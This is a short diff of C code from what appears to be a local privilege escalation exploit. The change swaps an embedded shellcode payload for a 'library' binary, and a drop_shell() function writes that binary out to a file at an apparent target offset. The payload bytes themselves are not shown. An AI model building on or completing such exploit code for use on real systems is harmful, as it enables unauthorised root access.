@@ -1,5 +1,5 @@
 #include "lpe.h"
-#include "shellcode.h"
+#include "library_bin.h"
 #include "utils.h"
 #define ENV_LEN 512
 #define TARGET_OFFSET_START 0x786
@@ -36,8 +36,8 @@ void drop_shell() {
 
   CHECK(p == 0);
 
-  global->fwrite(SHELLCODE_BIN, sizeof(char),
-                 sizeof(SHELLCODE_BIN) / sizeof(char), p);
+  global->fwrite(LIBRARY_BIN, sizeof(char),
+                 sizeof(LIBRARY_BIN) / sizeof(char), p);
   global->fclose(p);
 }
 
